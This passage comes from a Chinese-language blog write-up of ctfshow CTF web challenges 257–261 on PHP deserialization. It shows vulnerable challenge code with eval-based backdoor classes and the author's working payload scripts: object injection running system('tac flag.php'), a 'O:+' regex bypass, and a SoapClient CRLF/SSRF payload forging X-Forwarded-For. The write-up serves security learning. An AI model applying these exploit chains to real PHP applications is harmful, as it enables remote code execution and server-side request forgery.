class=\"keyword\">return</span> <span class=\"variable language_\">$this</span>-&gt;username===<span class=\"variable\">$u</span>&amp;&amp;<span class=\"variable language_\">$this</span>-&gt;password===<span class=\"variable\">$p</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;<span class=\"class\"><span class=\"keyword\">class</span>-&gt;<span class=\"title\">getInfo</span>();</span></span><br><span class=\"line\"><span class=\"class\">    &#125;</span></span><br><span class=\"line\"><span class=\"class\"></span></span><br><span class=\"line\"><span class=\"class\">&#125;</span></span><br><span class=\"line\"><span class=\"class\"></span></span><br><span class=\"line\"><span class=\"class\"><span class=\"title\">class</span> <span class=\"title\">info</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$user</span>=<span class=\"string\">&#x27;xxxxxx&#x27;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getInfo</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"variable language_\">$this</span>-&gt;user;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">backDoor</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$code</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getInfo</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">eval</span>(<span class=\"variable language_\">$this</span>-&gt;code);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$username</span>=<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;username&#x27;</span>];</span><br><span class=\"line\"><span class=\"variable\">$password</span>=<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;password&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$username</span>) &amp;&amp; <span class=\"keyword\">isset</span>(<span class=\"variable\">$password</span>))&#123;</span><br><span class=\"line\">    <span class=\"variable\">$user</span> = <span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$_COOKIE</span>[<span class=\"string\">&#x27;user&#x27;</span>]);</span><br><span class=\"line\">    <span class=\"variable\">$user</span>-&gt;<span class=\"title function_ invoke__\">login</span>(<span class=\"variable\">$username</span>,<span class=\"variable\">$password</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t\t这个题第一次遇到了魔术方法， 由于存在 backDoor 类，里面有可以进行 RCE 的点，所以，这里可以想办法触发 <code>__construct</code>  方法以及修改参数来创建这个类，但是，由于 info 类和 backDoor 类都有一个同名的方法，就是 getInfo，所以在脚本结束的时候，也就是释放或者销毁类的时候就会调用 <code>__destruct</code>  方法， 然后调用到 backDoor 类里的 getInfo 方法进行 RCE。生成 payload 的脚本如下：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ctfShowUser</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$username</span> = <span class=\"string\">&#x27;xxxxxx&#x27;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$password</span> = <span class=\"string\">&#x27;xxxxxx&#x27;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$isVip</span> = <span class=\"literal\">true</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$class</span> = <span class=\"string\">&#x27;info&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;<span class=\"class\"><span class=\"keyword\">class</span> = <span class=\"title\">new</span> <span class=\"title\">backDoor</span>();</span></span><br><span class=\"line\"><span class=\"class\">    &#125;</span></span><br><span class=\"line\"><span class=\"class\">&#125;</span></span><br><span class=\"line\"><span class=\"class\"></span></span><br><span class=\"line\"><span class=\"class\"><span class=\"title\">class</span> <span class=\"title\">info</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$user</span> = <span class=\"string\">&#x27;xxxxxx&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getInfo</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"variable language_\">$this</span>-&gt;user;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">backDoor</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$code</span> = <span class=\"string\">&quot;system(&#x27;tac flag.php&#x27;);&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getInfo</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">eval</span>(<span class=\"variable language_\">$this</span>-&gt;code);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$a</span> = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">ctfShowUser</span>();</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">urlencode</span>(<span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$a</span>));</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h1 id=\"web258\"><a class=\"markdownIt-Anchor\" href=\"#web258\">#</a> web258：</h1>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ctfShowUser</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$username</span>=<span class=\"string\">&#x27;xxxxxx&#x27;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$password</span>=<span class=\"string\">&#x27;xxxxxx&#x27;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$isVip</span>=<span class=\"literal\">false</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$class</span> = <span class=\"string\">&#x27;info&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;<span class=\"class\"><span class=\"keyword\">class</span>=<span class=\"title\">new</span> <span class=\"title\">info</span>();</span></span><br><span class=\"line\"><span class=\"class\">    &#125;</span></span><br><span class=\"line\"><span class=\"class\">    <span class=\"title\">public</span> <span class=\"title\">function</span> <span class=\"title\">login</span>($<span class=\"title\">u</span>,$<span class=\"title\">p</span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"variable language_\">$this</span>-&gt;username===<span class=\"variable\">$u</span>&amp;&amp;<span class=\"variable language_\">$this</span>-&gt;password===<span class=\"variable\">$p</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;<span class=\"class\"><span class=\"keyword\">class</span>-&gt;<span class=\"title\">getInfo</span>();</span></span><br><span class=\"line\"><span class=\"class\">    &#125;</span></span><br><span class=\"line\"><span class=\"class\"></span></span><br><span class=\"line\"><span class=\"class\">&#125;</span></span><br><span class=\"line\"><span class=\"class\"></span></span><br><span class=\"line\"><span class=\"class\"><span class=\"title\">class</span> <span class=\"title\">info</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$user</span>=<span class=\"string\">&#x27;xxxxxx&#x27;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getInfo</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"variable language_\">$this</span>-&gt;user;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">backDoor</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$code</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getInfo</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">eval</span>(<span class=\"variable language_\">$this</span>-&gt;code);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$username</span>=<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;username&#x27;</span>];</span><br><span class=\"line\"><span class=\"variable\">$password</span>=<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;password&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$username</span>) &amp;&amp; <span class=\"keyword\">isset</span>(<span class=\"variable\">$password</span>))&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&#x27;/[oc]:\\d+:/i&#x27;</span>, <span class=\"variable\">$_COOKIE</span>[<span class=\"string\">&#x27;user&#x27;</span>]))&#123;</span><br><span class=\"line\">        <span class=\"variable\">$user</span> = <span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$_COOKIE</span>[<span class=\"string\">&#x27;user&#x27;</span>]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"variable\">$user</span>-&gt;<span class=\"title function_ invoke__\">login</span>(<span class=\"variable\">$username</span>,<span class=\"variable\">$password</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t\t这个题对比上一题，多了个正则过滤，基本上就是过滤了 o: 数字 以及 c: 数字 ，这种形式，这里可以使用加号绕过：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ctfShowUser</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$class</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;<span class=\"class\"><span class=\"keyword\">class</span> = <span class=\"title\">new</span> <span class=\"title\">backDoor</span>();</span></span><br><span class=\"line\"><span class=\"class\">    &#125;</span></span><br><span class=\"line\"><span class=\"class\">&#125;</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"title\">class</span> <span class=\"title\">backDoor</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$code</span> = <span class=\"string\">&quot;system(&#x27;tac fl*&#x27;);&quot;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$a</span> = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">ctfShowUser</span>();</span><br><span class=\"line\"><span class=\"variable\">$b</span> = <span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$a</span>);</span><br><span class=\"line\"><span class=\"variable\">$b</span> = <span class=\"title function_ invoke__\">str_replace</span>(<span class=\"string\">&quot;O:&quot;</span>,<span class=\"string\">&quot;O:+&quot;</span>,<span class=\"variable\">$b</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">urlencode</span>(<span class=\"variable\">$b</span>);</span><br></pre></td></tr></table></figure>\n<p>​\t\t这个构造我踩了不少坑，最严重的是 system 函数后面，没有加分号，这个是最大的问题，我一直以为没有成功，结果是因为每家分号。</p>\n<h1 id=\"web259\"><a class=\"markdownIt-Anchor\" href=\"#web259\">#</a> web259：</h1>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$vip</span> = <span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;vip&#x27;</span>]);</span><br><span class=\"line\"><span class=\"comment\">//vip can get flag one key</span></span><br><span class=\"line\"><span class=\"variable\">$vip</span>-&gt;<span class=\"title function_ invoke__\">getFlag</span>();</span><br></pre></td></tr></table></figure>\n<p>​\t\t这个题给的信息好少，不会做，看下 wp。</p>\n<p>​\t\t这一题主要考察了原生类的反序列化，好吧，第一次遇到完全想不到，即使学了原生类也没想到。</p>\n<p>​\t\t由于整个 index 里面没有任何类，所以后面的反序列化加上 $vip-&gt;getFlag (); 给人第一反应应该是调用了一个不存在的方法以及原生类结合，触发 <code>__call</code>  魔术方法，</p>\n<p>​\t\t贴一个链接，这个文章感觉很详细：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1l1cHBpZTAwMS9hcnRpY2xlL2RldGFpbHMvMTM5ODY1NTA1P29wc19yZXF1ZXN0X21pc2M9JTI1N0IlMjUyMnJlcXVlc3QlMjU1RmlkJTI1MjIlMjUzQSUyNTIyOEZGNkI0MEItMkJDMS00MjAxLTg3MTgtMUQyMzE4MUEwRDY0JTI1MjIlMjUyQyUyNTIyc2NtJTI1MjIlMjUzQSUyNTIyMjAxNDA3MTMuMTMwMTAyMzM0Li4lMjUyMiUyNTdEJmFtcDtyZXF1ZXN0X2lkPThGRjZCNDBCLTJCQzEtNDIwMS04NzE4LTFEMjMxODFBMEQ2NCZhbXA7Yml6X2lkPTAmYW1wO3V0bV9tZWRpdW09ZGlzdHJpYnV0ZS5wY19zZWFyY2hfcmVzdWx0Lm5vbmUtdGFzay1ibG9nLTJ+YWxsfnNvYmFpZHVlbmR+ZGVmYXVsdC0yLTEzOTg2NTUwNS1udWxsLW51bGwuMTQyJTVFdjEwMCU1RXBjX3NlYXJjaF9yZXN1bHRfYmFzZTYmYW1wO3V0bV90ZXJtPVNvYXBDbGllbnQlRTUlOEUlOUYlRTclOTQlOUYlRTclQjElQkImYW1wO3NwbT0xMDE4LjIyMjYuMzAwMS40MTg3\">【靶场】ctfshow 详解 web259 原生类反序列化</span></p>\n<p>​\t\t这里是使用的 Soapclient 原生类：</p>\n<blockquote>\n<p><strong>Soapclient 原生类主要作用是使 PHP 应用程序能够方便地调用远程的 SOAP 服务</strong></p>\n<p><strong>SoapClient 原生类，类似于 curl 一样的存在，基于 XML 的协议，它使应用程序通过 HTTP 来交换信息</strong></p>\n</blockquote>\n<p>​\t\t提示里给了这个：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">flag.php</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"variable\">$xff</span> = <span class=\"title function_ invoke__\">explode</span>(<span class=\"string\">&#x27;,&#x27;</span>, <span class=\"variable\">$_SERVER</span>[<span class=\"string\">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">array_pop</span>(<span class=\"variable\">$xff</span>);</span><br><span class=\"line\"><span class=\"variable\">$ip</span> = <span class=\"title function_ invoke__\">array_pop</span>(<span class=\"variable\">$xff</span>);</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"variable\">$ip</span>!==<span class=\"string\">&#x27;127.0.0.1&#x27;</span>)&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">die</span>(<span class=\"string\">&#x27;error&#x27;</span>);</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">\t<span class=\"variable\">$token</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;token&#x27;</span>];</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(<span class=\"variable\">$token</span>==<span class=\"string\">&#x27;ctfshow&#x27;</span>)&#123;</span><br><span class=\"line\">\t\t<span class=\"title function_ invoke__\">file_put_contents</span>(<span class=\"string\">&#x27;flag.txt&#x27;</span>,<span class=\"variable\">$flag</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t\t这里可以看出来，flag,php 文件会帮我们获得 flag 的值，但是，需要提前检测 ip，也就是 xff 的值。</p>\n<p>​\t\t从代码上看直接访问 flag.php 给 X_FORWARDED_FOR 赋值 127.0.0.1 三次 (127.0.0.1, 127.0.0.1,  127.0.0.1) 就可以绕过 array_pop (删除数组末尾的值), 在传入 token 等于 ctfshow 就能得到 flag</p>\n<p>​\t\t所以，构造 payload 的脚本如下：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"variable\">$ua</span> = <span class=\"string\">&quot;ceshi\\r\\nX-Forwarded-For: 127.0.0.1,127.0.0.1,127.0.0.1\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nContent-Length: 13\\r\\n\\r\\ntoken=ctfshow&quot;</span>;</span><br><span class=\"line\"><span class=\"variable\">$client</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">SoapClient</span>(<span class=\"literal\">null</span>,<span class=\"keyword\">array</span>(<span class=\"string\">&#x27;uri&#x27;</span> =&gt; <span class=\"string\">&#x27;http://127.0.0.1/&#x27;</span> , <span class=\"string\">&#x27;location&#x27;</span> =&gt; <span class=\"string\">&#x27;http://127.0.0.1/flag.php&#x27;</span> , <span class=\"string\">&#x27;user_agent&#x27;</span> =&gt; <span class=\"variable\">$ua</span>));</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">urlencode</span>(<span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$client</span>));</span><br></pre></td></tr></table></figure>\n<p>​\t\t完成上面的生成操作得安装 php-soap 拓展，我这里用的是 phpstudy，它自带这个拓展，但是没有编译。打开 php-ini，找到 extension=php_soap.dll，把前面的分号去掉。</p>\n<p>​\t\t之后得到的 payload 发送之后直接读取 flag.txt 即可。</p>\n<h1 id=\"web260\"><a class=\"markdownIt-Anchor\" href=\"#web260\">#</a> web260：</h1>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"><span class=\"keyword\">include</span>(<span class=\"string\">&#x27;flag.php&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&#x27;/ctfshow_i_love_36D/&#x27;</span>,<span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;ctfshow&#x27;</span>])))&#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"variable\">$flag</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t\t 没搞懂这个题的意义是啥，算了无脑了：get 传一个 ctfshow=ctfshow_i_love_36D 即可得到 flag。</p>\n<h1 id=\"web261\"><a class=\"markdownIt-Anchor\" href=\"#web261\">#</a> web261：</h1>\n<p>​\t\t提示里出现了个打 redis，有点害怕了。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ctfshowvip</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$username</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$password</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$code</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$u</span>,<span class=\"variable\">$p</span></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;username=<span class=\"variable\">$u</span>;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;password=<span class=\"variable\">$p</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__wakeup</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"variable language_\">$this</span>-&gt;username!=<span class=\"string\">&#x27;&#x27;</span> || <span class=\"variable language_\">$this</span>-&gt;password!=<span class=\"string\">&#x27;&#x27;</span>)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;error&#x27;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__invoke</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">eval</span>(<span class=\"variable language_\">$this</span>-&gt;code);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__sleep</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;username=<span class=\"string\">&#x27;&#x27;</span>;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;password=<span class=\"string\">&#x27;&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__unserialize</span>(<span class=\"params\"><span class=\"variable\">$data</span></span>)</span>&#123;</span><br><span class=\"line\">        <span 